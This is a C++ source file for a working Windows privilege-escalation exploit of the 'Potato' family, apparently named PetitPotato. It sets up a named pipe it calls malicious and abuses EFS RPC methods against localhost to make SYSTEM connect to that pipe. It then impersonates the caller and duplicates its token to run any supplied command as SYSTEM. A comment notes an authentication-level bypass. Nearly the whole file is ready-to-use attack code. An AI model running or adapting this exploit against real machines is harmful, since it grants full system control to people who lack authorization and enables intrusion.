#pragma once

#include "ms-efsr_h.h"
#include <thread>
#include <tchar.h>
#include <strsafe.h>
#include <iostream>
#include <userenv.h>

#pragma comment(lib, "RpcRT4.lib")
#pragma comment(lib, "userenv.lib")


HANDLE CreatePetitNamedPipe();

HANDLE ConnectPetitNamedPipe(HANDLE hNamedPipe);

DWORD WINAPI LaunchPetitNamedPipeServer(LPVOID lpParam);

void GetSystem(HANDLE hNamedPipe, LPWSTR lpCommandLine);

void PetitPotamConnect(DWORD EfsID);

BOOL g_bInteractWithConsole = TRUE;


void _tmain(int argc, TCHAR* argv[])
{
    if (argc != 3)
    {
        printf("\nUsage: %S [EfsID] [Command]\n\n", argv[0]);
        printf("The available EfsIDs are as follows: \n");
        printf("    [0] EfsRpcOpenFileRaw\n");
        printf("    [1] EfsRpcEncryptFileSrv\n");
        printf("    [2] EfsRpcDecryptFileSrv\n");
        printf("    [3] EfsRpcQueryUsersOnFile\n");
        printf("    [4] EfsRpcQueryRecoveryAgents\n");
        printf("    [5] EfsRpcRemoveUsersFromFile (Failed)\n");
        printf("    [6] EfsRpcAddUsersToFile\n");
        printf("    [7] EfsRpcFileKeyInfo\n");
        printf("    [8] EfsRpcDuplicateEncryptionInfoFile (Failed)\n");
        printf("    [9] EfsRpcAddUsersToFileEx\n");
        printf("    [10] EfsRpcFileKeyInfoEx (Failed)\n");
        printf("    [11] EfsRpcGetEncryptedFileMetadata (Failed)\n");
        printf("    [12] EfsRpcSetEncryptedFileMetadata (Failed)\n");

        return;
    }

    HANDLE hThread = NULL;

    hThread = CreateThread(NULL, 0, LaunchPetitNamedPipeServer, (LPWSTR)argv[2], 0, NULL);
    DWORD EfsID = (DWORD)_wtol((TCHAR*)argv[1]);

    Sleep(1000);
    PetitPotamConnect(EfsID);
    Sleep(1500);
}


DWORD WINAPI LaunchPetitNamedPipeServer(LPVOID lpParam)
{
    HANDLE hNamedPipe = NULL;
    LPWSTR lpName;
    LPWSTR lpCommandLine = (LPWSTR)lpParam;

    SECURITY_DESCRIPTOR sd = { 0 };
    SECURITY_ATTRIBUTES sa = { 0 };

    lpName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintf(lpName, MAX_PATH, L"\\\\.\\pipe\\petit\\pipe\\srvsvc");

    if ((hNamedPipe = CreateNamedPipe(lpName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa)))
    {
        printf("\n[+] Malicious named pipe running on %S.\n", lpName);
    }
    else
    {
        printf("[-] ImpersonateNamedPipeClient() Error: %i.\n", GetLastError());
        return 0;
    }

    if (ConnectNamedPipe(hNamedPipe, NULL) != NULL)
    {
        printf("[+] The connection is successful.\n");
    }
    else
    {
        printf("[-] ConnectNamedPipe() Error: %i.\n", GetLastError());
        return 0;
    }

    GetSystem(hNamedPipe, lpCommandLine);
    CloseHandle(hNamedPipe);

    return 0;
}


void GetSystem(HANDLE hNamedPipe, LPWSTR lpCommandLine)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    HANDLE hProcess;
    HANDLE hToken = NULL;
    HANDLE phNewToken = NULL;

    DWORD dwCreationFlags = 0;
    LPWSTR lpCurrentDirectory = NULL;
    LPVOID lpEnvironment = NULL;

    // clear a block of memory
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (ImpersonateNamedPipeClient(hNamedPipe))
    {
        printf("[+] ImpersonateNamedPipeClient OK.\n");
    }
    else
    {
        printf("[-] ImpersonateNamedPipeClient() Error: %i.\n", GetLastError());
        goto cleanup;
    }

    if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken))
    {
        printf("[+] OpenThreadToken OK.\n");
    }
    else
    {
        printf("[-] OpenThreadToken() Error: %i.\n", GetLastError());
        goto cleanup;
    }

    if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &phNewToken))
    {
        printf("[+] DuplicateTokenEx OK.\n");
    }
    else
    {
        printf("[-] DupicateTokenEx() Error: %i.\n", GetLastError());
        goto cleanup;
    }

    dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
    dwCreationFlags |= g_bInteractWithConsole ? 0 : CREATE_NEW_CONSOLE;

    if (!(lpCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
    {
        goto cleanup;
    }

    if (!GetSystemDirectory(lpCurrentDirectory, MAX_PATH))
    {
        printf("[-] GetSystemDirectory() Error: %i.\n", GetLastError());
        goto cleanup;
    }

    if (!CreateEnvironmentBlock(&lpEnvironment, phNewToken, FALSE))
    {
        printf("[-] CreateEnvironmentBlock() Error: %i.\n", GetLastError());
        goto cleanup;
    }

    if (CreateProcessAsUser(phNewToken, NULL, lpCommandLine, NULL, NULL, TRUE, dwCreationFlags, lpEnvironment, lpCurrentDirectory, &si, &pi))
    {
        printf("[+] CreateProcessAsUser OK.\n");
    }
    else if (GetLastError() != NULL)
    {   
        RevertToSelf();
        printf("[!] CreateProcessAsUser() failed, possibly due to missing privileges, retrying with CreateProcessWithTokenW().\n");
        
        if (CreateProcessWithTokenW(phNewToken, LOGON_WITH_PROFILE, NULL, lpCommandLine, dwCreationFlags, lpEnvironment, lpCurrentDirectory, &si, &pi))
        {
            printf("[+] CreateProcessWithTokenW OK.\n");
        }
        else
        {
            printf("[-] CreateProcessWithTokenW failed (%d).\n", GetLastError());
            goto cleanup;
        }
    }

    if (g_bInteractWithConsole)
    {
        fflush(stdout);
        WaitForSingleObject(pi.hProcess, INFINITE);
    }

cleanup:
    if (hToken)
        CloseHandle(hToken);
    if (phNewToken)
        CloseHandle(phNewToken);
    if (lpCurrentDirectory)
        free(lpCurrentDirectory);
    if (lpEnvironment)
        DestroyEnvironmentBlock(lpEnvironment);
    if (pi.hProcess)
        CloseHandle(pi.hProcess);
    if (pi.hThread)
        CloseHandle(pi.hThread);

    return;
}


void PetitPotamConnect(DWORD EfsID)
{
    RPC_WSTR ObjUuid = (RPC_WSTR)L"df1941c5-fe89-4e79-bf10-463657acf44d";    // Pointer to a null-terminated string representation of an object UUID. 
    RPC_WSTR ProtSeq = (RPC_WSTR)L"ncacn_np";                                // Pointer to a null-terminated string representation of a protocol sequence.;
    RPC_WSTR NetworkAddr = (RPC_WSTR)L"\\\\127.0.0.1";                       // Pointer to a null-terminated string representation of a network address.
    RPC_WSTR Endpoint = (RPC_WSTR)L"\\pipe\\efsrpc";                          // Pointer to a null-terminated string representation of an endpoint.
    RPC_WSTR Options = NULL;                                                 // Pointer to a null-terminated string representation of network options.
    RPC_WSTR StringBinding;                                                  // Returns a pointer to a pointer to a null-terminated string representation of a binding handle.

    RPC_STATUS RpcStatus;

    RPC_BINDING_HANDLE binding_h;

    RpcStatus = RpcStringBindingComposeW(ObjUuid, ProtSeq, NetworkAddr, Endpoint, Options, &StringBinding);
    if (RpcStatus != RPC_S_OK) {
        printf("[-] RpcStringBindingComposeW() Error: %i\n", GetLastError());
        return;
    }


    RpcStatus = RpcBindingFromStringBindingW(
        StringBinding,    // Previously created string binding
        &binding_h    // Output binding handle
    );
    if (RpcStatus != RPC_S_OK) {
        printf("[-] RpcBindingFromStringBindingW() Error: %i\n", GetLastError());
        return;
    }

    // PetitPotam bypass via RPC_C_AUTHN_LEVEL_PKT_PRIVACY: https://github.com/zcgonvh/EfsPotato/pull/5
    RpcStatus = RpcBindingSetAuthInfoW(binding_h, NetworkAddr, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE, 0, RPC_C_AUTHZ_NONE);
    if (RpcStatus != RPC_S_OK) {
        printf("[-] RpcBindingSetAuthInfoW() Error: %i\n", GetLastError());
        return;
    }

    RpcStatus = RpcBindingSetOption(binding_h, 12, 50000);
    if (RpcStatus != RPC_S_OK) {
        printf("[-] RpcBindingSetOption() Error: %i\n", GetLastError());
        return;
    }

    RpcStringFreeW(&StringBinding);
    if (RpcStatus != RPC_S_OK) {
        printf("[-] RpcStringFreeW() Error: %i\n", GetLastError());
        return;
    }

    RpcTryExcept
    {
        // Invoke remote procedure here
        LPWSTR PipeFileName;
        long result;

        PipeFileName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
        StringCchPrintf(PipeFileName, MAX_PATH, L"\\\\localhost/pipe/petit\\C$\\wh0nqs.txt");


        if (EfsID == 0)
        {
            wprintf(L"[+] Invoking EfsRpcOpenFileRaw with target path: %ws.\r\n", PipeFileName);

            /*
             *  long EfsRpcOpenFileRaw(
             *      [in] handle_t binding_h,
             *      [out] PEXIMPORT_CONTEXT_HANDLE* hContext,
             *      [in, string] wchar_t* FileName,
             *      [in] long Flags
             *  );
             */

            PVOID hContext;
            result = EfsRpcOpenFileRaw(binding_h, &hContext, PipeFileName, 0);
        }

        if (EfsID == 1)
        {
            wprintf(L"[+] Invoking EfsRpcEncryptFileSrv with target path: %ws.\r\n", PipeFileName);

            /*
             *  long EfsRpcEncryptFileSrv(
             *      [in] handle_t binding_h,
             *      [in, string] wchar_t* FileName
             *  );
            */

            result = EfsRpcEncryptFileSrv(binding_h, PipeFileName);
        }

        if (EfsID == 2)
        {
            wprintf(L"[+] Invoking EfsRpcDecryptFileSrv with target path: %ws.\r\n", PipeFileName);

            /*
             *  long EfsRpcDecryptFileSrv(
             *      [in] handle_t binding_h,
             *      [in, string] wchar_t* FileName,
             *      [in] unsigned long OpenFlag
             *  );
             */

            result = EfsRpcDecryptFileSrv(binding_h, PipeFileName, 0);
        }

        if (EfsID == 3)
        {
            wprintf(L"[+] Invoking EfsRpcQueryUsersOnFile with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcQueryUsersOnFile(
             *      [in] handle_t binding_h,
             *      [in, string] wchar_t* FileName,
             *      [out] ENCRYPTION_CERTIFICATE_HASH_LIST * *Users
             *  );
             */

            ENCRYPTION_CERTIFICATE_HASH_LIST* Users;
            result = EfsRpcQueryUsersOnFile(binding_h, PipeFileName, &Users);
        }
        if (EfsID == 4)
        {
            wprintf(L"[+] Invoking EfsRpcQueryRecoveryAgents with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcQueryRecoveryAgents(
             *      [in] handle_t binding_h,
             *      [in, string] wchar_t* FileName,
             *      [out] ENCRYPTION_CERTIFICATE_HASH_LIST * *RecoveryAgents
             *  );
             */

            ENCRYPTION_CERTIFICATE_HASH_LIST* RecoveryAgents;
            result = EfsRpcQueryRecoveryAgents(binding_h, PipeFileName, &RecoveryAgents);
        }
        if (EfsID == 5)    // error
        {
            wprintf(L"[+] Invoking EfsRpcRemoveUsersFromFile with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcRemoveUsersFromFile(
             *      [in] handle_t binding_h,
             *      [in, string] wchar_t* FileName,
             *      [in] ENCRYPTION_CERTIFICATE_HASH_LIST* Users
             *  );
             */

            ENCRYPTION_CERTIFICATE_HASH_LIST Users;
            result = EfsRpcRemoveUsersFromFile(binding_h, PipeFileName, &Users);
        }
        if (EfsID == 6)
        {
            wprintf(L"[+] Invoking EfsRpcAddUsersToFile with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcAddUsersToFile(
             *      [in] handle_t binding_h,
             *      [in, string] wchar_t* FileName,
             *      [in] ENCRYPTION_CERTIFICATE_LIST * EncryptionCertificates
             *  );
             */

            ENCRYPTION_CERTIFICATE_LIST EncryptionCertificates;
            result = EfsRpcAddUsersToFile(binding_h, PipeFileName, &EncryptionCertificates);
        }
        if (EfsID == 7)
        {
            wprintf(L"[+] Invoking EfsRpcFileKeyInfo with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcFileKeyInfo(
             *      [in] handle_t binding_h,
             *      [in, string] wchar_t* FileName,
             *      [in] DWORD InfoClass,
             *      [out] EFS_RPC_BLOB** KeyInfo
             *  );
             */

            EFS_RPC_BLOB* KeyInfo;
            result = EfsRpcFileKeyInfo(binding_h, PipeFileName, 0, &KeyInfo);

        }
        if (EfsID == 8)    // error
        {
            wprintf(L"[+] Invoking EfsRpcDuplicateEncryptionInfoFile with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcDuplicateEncryptionInfoFile(
             *      [in] handle_t binding_h,
             *      [in, string] wchar_t* SrcFileName,
             *      [in, string] wchar_t* DestFileName,
             *      [in] DWORD dwCreationDisposition,
             *      [in] DWORD dwAttributes,
             *      [in, unique] EFS_RPC_BLOB* RelativeSD,
             *      [in] BOOL bInheritHandle
             *  );
             */

            EFS_RPC_BLOB RelativeSD;
            result = EfsRpcDuplicateEncryptionInfoFile(binding_h, PipeFileName, PipeFileName, 1, 0, &RelativeSD, FALSE);
        }

        if (EfsID == 9)
        {
            wprintf(L"[+] Invoking EfsRpcAddUsersToFileEx with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcAddUsersToFileEx(
             *      [in] handle_t binding_h,
             *      [in] DWORD dwFlags,
             *      [in, unique] EFS_RPC_BLOB* Reserved,
             *      [in, string] wchar_t* FileName,
             *      [in] ENCRYPTION_CERTIFICATE_LIST* EncryptionCertificates
             *  );
             */

            EFS_RPC_BLOB Reserved;
            ENCRYPTION_CERTIFICATE_LIST EncryptionCertificates;
            result = EfsRpcAddUsersToFileEx(binding_h, 0, &Reserved, PipeFileName, &EncryptionCertificates);
        }

        if (EfsID == 10)    // error
        {
            wprintf(L"[+] Invoking EfsRpcFileKeyInfoEx with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcFileKeyInfoEx(
             *      [in] handle_t binding_h,
             *      [in] DWORD dwFileKeyInfoFlags,
             *      [in, unique] EFS_RPC_BLOB* Reserved,
             *      [in, string] wchar_t* FileName,
             *      [in] DWORD InfoClass,
             *      [out] EFS_RPC_BLOB** KeyInfo
             *  );
             */

            EFS_RPC_BLOB Reserved;
            EFS_RPC_BLOB* KeyInfo;
            result = EfsRpcFileKeyInfoEx(binding_h, 0, &Reserved, PipeFileName, 0, &KeyInfo);
        }
        if (EfsID == 11)    // error
        {
            wprintf(L"[+] Invoking EfsRpcGetEncryptedFileMetadata with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcGetEncryptedFileMetadata(
             *      [in] handle_t binding_h,
             *      [in, string, ref] wchar_t* FileName,
             *      [out, ref] EFS_RPC_BLOB ** EfsStreamBlob
             *  );
             */

            EFS_RPC_BLOB* EfsStreamBlob;
            result = EfsRpcGetEncryptedFileMetadata(binding_h, PipeFileName, &EfsStreamBlob);
        }

        if (EfsID == 12)    // error
        {
            wprintf(L"[+] Invoking EfsRpcSetEncryptedFileMetadata with target path: %ws.\r\n", PipeFileName);

            /*
             *  DWORD EfsRpcSetEncryptedFileMetadata(
             *      [in] handle_t binding_h,
             *      [in, string, ref] wchar_t* FileName,
             *      [in, unique] EFS_RPC_BLOB* OldEfsStreamBlob,
             *      [in, ref] EFS_RPC_BLOB* NewEfsStreamBlob,
             *      [in, unique] ENCRYPTED_FILE_METADATA_SIGNATURE* NewEfsSignature
             *  );
             */

            EFS_RPC_BLOB OldEfsStreamBlob;
            EFS_RPC_BLOB NewEfsStreamBlob;
            ENCRYPTED_FILE_METADATA_SIGNATURE NewEfsSignature;
            result = EfsRpcSetEncryptedFileMetadata(binding_h, PipeFileName, &OldEfsStreamBlob, &NewEfsStreamBlob, &NewEfsSignature);
        }

        LocalFree(PipeFileName);
    }
    RpcExcept(EXCEPTION_EXECUTE_HANDLER);
    {
        wprintf(L"Exception: %d - 0x%08x.\r\n", RpcExceptionCode(), RpcExceptionCode());
    }
    RpcEndExcept
    {
        RpcBindingFree(&binding_h);
    }
}


void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
    return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
    free(p);
}